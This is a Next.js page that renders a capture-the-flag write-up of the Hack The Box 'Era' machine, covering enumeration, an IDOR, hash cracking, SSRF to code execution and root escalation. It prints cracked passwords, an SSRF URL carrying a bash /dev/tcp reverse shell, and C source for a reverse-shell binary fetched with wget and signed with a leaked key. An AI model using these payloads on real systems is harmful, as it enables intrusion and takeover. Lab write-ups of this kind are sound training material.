import React from 'react';
import Image from 'next/image';
import type { Metadata } from 'next';
import ProtectedWriteUp from '../components/ProtectedWriteUp';

export const metadata: Metadata = {
  title: 'Era - HTB Machine Write-up | Sidd Sehgal',
  description: 'Complete walkthrough of the Era HTB machine - a medium difficulty Linux machine involving vhost enumeration, IDOR vulnerability, hash cracking, SSRF exploitation, and binary signing for privilege escalation.',
  keywords: [
    'Era',
    'HTB Machine',
    'Hack The Box',
    'Vhost Enumeration',
    'IDOR',
    'Hash Cracking',
    'SSRF',
    'Binary Signing',
    'Privilege Escalation',
    'Linux',
    'Write-up',
    'Walkthrough'
  ],
  openGraph: {
    title: 'Era - HTB Machine Write-up | Sidd Sehgal',
    description: 'Complete walkthrough of the Era HTB machine - a medium difficulty Linux machine involving vhost enumeration, IDOR vulnerability, hash cracking, SSRF exploitation, and binary signing for privilege escalation.',
  },
};

export default function EraWriteUp() {
  return (
    <ProtectedWriteUp
      slug="era"
      title="Era (Linux, Medium) - Walkthrough"
    >
      <div className="space-y-8">
        {/* Reconnaissance Section */}
        <section>
          <h2 className="text-2xl font-bold text-blue-400 mb-4">Reconnaissance</h2>
          
          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Nmap Scan</h3>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`┌─[eu-dedivip-2]─[10.10.14.22]─[s1dd@htb-ne8e8oes2m]─[~]
└──╼ [★]$ nmap -sS -T3 -sC -sV --max-retries 3 --open -Pn 10.129.154.188 -oN initial_scan.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-27 06:00 CDT
Nmap scan report for 10.129.154.188
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds`}
              </pre>
            </div>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">FTP Enumeration</h3>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`┌─[eu-dedivip-2]─[10.10.14.22]─[s1dd@htb-ne8e8oes2m]─[~]
└──╼ [★]$ ftp 10.129.154.188
Connected to 10.129.154.188.
220 (vsFTPd 3.0.5)
Name (10.129.154.188:root): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.`}
              </pre>
            </div>
            <p className="text-neutral-400 mt-3">
              Anonymous FTP access didn&apos;t work, but we&apos;ll need FTP for later. Added <code className="bg-neutral-800 px-2 py-1 rounded">10.129.154.188 era.htb</code> to /etc/hosts.
            </p>
          </div>
        </section>

        {/* Exploitation Section */}
        <section>
          <h2 className="text-2xl font-bold text-blue-400 mb-4">Exploitation</h2>
          
          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Web Application</h3>
            <p className="text-neutral-400 mb-4">
              We get a simple web app with a &quot;Contact Us&quot; section that appears vulnerable.
            </p>
            <div className="relative rounded-lg overflow-hidden mb-4">
              <Image
                src="/images/write-up-era/2025-07-27_16-47.webp"
                alt="Era web application interface"
                width={800}
                height={600}
                className="w-full h-auto"
                loading="lazy"
              />
            </div>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Directory Enumeration</h3>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`┌─[eu-dedivip-2]─[10.10.14.22]─[s1dd@htb-ne8e8oes2m]─[~]
└──╼ [★]$ gobuster dir -u http://era.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,py -t 40 -o gobuster-5000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://era.htb/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 19493]
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]`}
              </pre>
            </div>
            <p className="text-neutral-400 mt-3">
              Nothing interesting found in directory enumeration. After getting help from HTB Discord, discovered we needed to look for vhosts.
            </p>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Vhost Discovery</h3>
            <div className="relative rounded-lg overflow-hidden mb-4">
              <Image
                src="/images/write-up-era/Screenshot 2025-07-31 at 13.48.17.webp"
                alt="Vhost enumeration showing file.era.htb"
                width={800}
                height={600}
                className="w-full h-auto"
                loading="lazy"
              />
            </div>
            <p className="text-neutral-400">
              Found vhost: <code className="bg-neutral-800 px-2 py-1 rounded">file.era.htb</code>. Remember to add this to /etc/hosts!
            </p>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Subdomain Enumeration</h3>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`┌─[eu-dedivip-2]─[10.10.14.174]─[s1dd@htb-bhk3c9ksxz]─[~]
└──╼ [★]$ gobuster dir -u http://file.era.htb/ -w /usr/share/wordlists/dirb/common.txt -t 50 --exclude-length 6765 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
/layout.php           (Status: 200) [Size: 0]
/LICENSE              (Status: 200) [Size: 34524]
/login.php            (Status: 200) [Size: 9214]
/logout.php           (Status: 200) [Size: 70]
/manage.php           (Status: 302) [Size: 0] [--> login.php]
/register.php         (Status: 200) [Size: 3205]
/upload.php           (Status: 302) [Size: 0] [--> login.php]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================`}
              </pre>
            </div>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">IDOR Vulnerability</h3>
            <p className="text-neutral-400 mb-4">
              Registered a user (test:test) at register.php. In upload.php, found an IDOR vulnerability in the id parameter. The id is only 4 digits, making it brute forceable.
            </p>
            <div className="relative rounded-lg overflow-hidden mb-4">
              <Image
                src="/images/write-up-era/2025-07-31_13-55.webp"
                alt="IDOR vulnerability in upload.php"
                width={800}
                height={600}
                className="w-full h-auto"
                loading="lazy"
              />
            </div>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Brute Force Attack</h3>
            <p className="text-neutral-400 mb-4">
              Used Burp Intruder with the 4-digits wordlist to brute force the id parameter.
            </p>
            <div className="relative rounded-lg overflow-hidden mb-4">
              <Image
                src="/images/write-up-era/Screenshot 2025-07-31 at 14.02.34.webp"
                alt="Burp Intruder brute force attack"
                width={800}
                height={600}
                className="w-full h-auto"
                loading="lazy"
              />
            </div>
            <p className="text-neutral-400">
              Found 2 valid IDs: 54 and 150. Downloaded both files.
            </p>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Hash Cracking</h3>
            <p className="text-neutral-400 mb-4">
              Extracted site-backup-30-08-24.zip and found filedb.sqlite. Dumped the database and found 6 users (1 admin, 5 regular users).
            </p>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.`}
              </pre>
            </div>
            <p className="text-neutral-400 mt-3">
              Cracked hashes using John and rockyou wordlist:
            </p>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`eric:america
yuri:mustang`}
              </pre>
            </div>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">SSRF Exploitation</h3>
            <p className="text-neutral-400 mb-4">
              Found SSRF vulnerability in download.php for admin_ef01cab31aa. The server blindly uses user input (format parameter) to connect to internal resources via PHP stream wrappers.
            </p>
            <p className="text-neutral-400 mb-4">
              Used reset.php to change admin security question, then accessed security_login.php.
            </p>
            <div className="relative rounded-lg overflow-hidden mb-4">
              <Image
                src="/images/write-up-era/Screenshot 2025-07-31 at 14.30.57.webp"
                alt="Reset.php interface"
                width={800}
                height={600}
                className="w-full h-auto"
                loading="lazy"
              />
            </div>
            <div className="relative rounded-lg overflow-hidden mb-4">
              <Image
                src="/images/write-up-era/Screenshot 2025-07-31 at 14.32.32.webp"
                alt="Security login interface"
                width={800}
                height={600}
                className="w-full h-auto"
                loading="lazy"
              />
            </div>
            <p className="text-neutral-400 mb-4">
              RCE payload (replace YOUR_IP):
            </p>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20"bash%20-i%20>%26%20%2Fdev%2Ftcp%2F10.10.14.174%2F4444%200%3E%261%22;`}
              </pre>
            </div>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Initial Shell</h3>
            <div className="relative rounded-lg overflow-hidden mb-4">
              <Image
                src="/images/write-up-era/Screenshot 2025-07-31 at 14.55.40.webp"
                alt="Initial shell access as yuri"
                width={800}
                height={600}
                className="w-full h-auto"
                loading="lazy"
              />
            </div>
            <p className="text-neutral-400">
              Successfully obtained shell as yuri, then switched to eric user to get user.txt.
            </p>
          </div>
        </section>

        {/* Root Section */}
        <section>
          <h2 className="text-2xl font-bold text-blue-400 mb-4">Root</h2>
          
          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Summary</h3>
            <p className="text-neutral-400 mb-4">
              A binary called <code className="bg-neutral-800 px-2 py-1 rounded">monitor</code> located at <code className="bg-neutral-800 px-2 py-1 rounded">/opt/AV/periodic-checks/monitor</code> is executed as root by <code className="bg-neutral-800 px-2 py-1 rounded">/root/initiate_monitoring.sh</code>. This binary is signed, so replacing it with a normal payload won&apos;t work unless we sign it with the valid private key.
            </p>
            <p className="text-neutral-400">
              We were given <code className="bg-neutral-800 px-2 py-1 rounded">key.pem</code> inside a zip archive, which we used to sign a reverse shell binary and escalate to root.
            </p>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Enumeration</h3>
            <p className="text-neutral-400 mb-4">
              Running <code className="bg-neutral-800 px-2 py-1 rounded">ps aux | grep root</code> showed:
            </p>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`root  7540 ... /bin/bash /root/initiate_monitoring.sh
root  7551 ... /opt/AV/periodic-checks/monitor`}
              </pre>
            </div>
            <p className="text-neutral-400 mt-3">
              This indicates <code className="bg-neutral-800 px-2 py-1 rounded">monitor</code> is periodically executed as root.
            </p>
          </div>

          <div className="glass-card rounded-xl p-6 mb-6">
            <h3 className="text-xl font-semibold text-white mb-3">Exploitation Steps</h3>
            
            <div className="space-y-4">
              <div>
                <h4 className="text-lg font-medium text-white mb-2">1. Create Reverse Shell Payload</h4>
                <p className="text-neutral-400 mb-2">Create a file called <code className="bg-neutral-800 px-2 py-1 rounded">exploit.c</code>:</p>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.174/1337 0>&1", NULL);
    return 0;
}`}
                  </pre>
                </div>
                <p className="text-neutral-400 mt-2">Compile it statically:</p>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`x86_64-linux-gnu-gcc -o monitor exploit.c -static`}
                  </pre>
                </div>
              </div>

              <div>
                <h4 className="text-lg font-medium text-white mb-2">2. Clone and Build ELF Signer</h4>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
cd linux-elf-binary-signer
make clean
gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations`}
                  </pre>
                </div>
              </div>

              <div>
                <h4 className="text-lg font-medium text-white mb-2">3. Extract Key</h4>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`unzip _.zip`}
                  </pre>
                </div>
                <p className="text-neutral-400 mt-2">You should now have <code className="bg-neutral-800 px-2 py-1 rounded">key.pem</code> in your current directory.</p>
              </div>

              <div>
                <h4 className="text-lg font-medium text-white mb-2">4. Sign the Payload</h4>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`./elf-sign sha256 ../key.pem ../key.pem ../monitor`}
                  </pre>
                </div>
                <p className="text-neutral-400 mt-2">If successful, rename the binary:</p>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`mv ../monitor ../monitor.1`}
                  </pre>
                </div>
              </div>

              <div>
                <h4 className="text-lg font-medium text-white mb-2">5. Serve the Payload</h4>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`python3 -m http.server 8000`}
                  </pre>
                </div>
              </div>

              <div>
                <h4 className="text-lg font-medium text-white mb-2">6. Upload and Replace on Target</h4>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`cd /opt/AV/periodic-checks
wget http://10.10.14.174:8000/monitor.1
rm monitor
mv monitor.1 monitor
chmod +x monitor`}
                  </pre>
                </div>
              </div>

              <div>
                <h4 className="text-lg font-medium text-white mb-2">7. Start Listener</h4>
                <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
                  <pre className="text-sm text-neutral-300">
{`nc -lnvp 1337`}
                  </pre>
                </div>
                <p className="text-neutral-400 mt-2">Wait for the system to execute <code className="bg-neutral-800 px-2 py-1 rounded">monitor</code>, and you&apos;ll receive a root shell.</p>
              </div>
            </div>
          </div>

          <div className="glass-card rounded-xl p-6">
            <h3 className="text-xl font-semibold text-white mb-3">Root Flag</h3>
            <div className="bg-neutral-900/50 rounded-lg p-4 overflow-x-auto">
              <pre className="text-sm text-neutral-300">
{`cat /root/root.txt
root-flag-here`}
              </pre>
            </div>
          </div>
        </section>
      </div>
    </ProtectedWriteUp>
  );
} 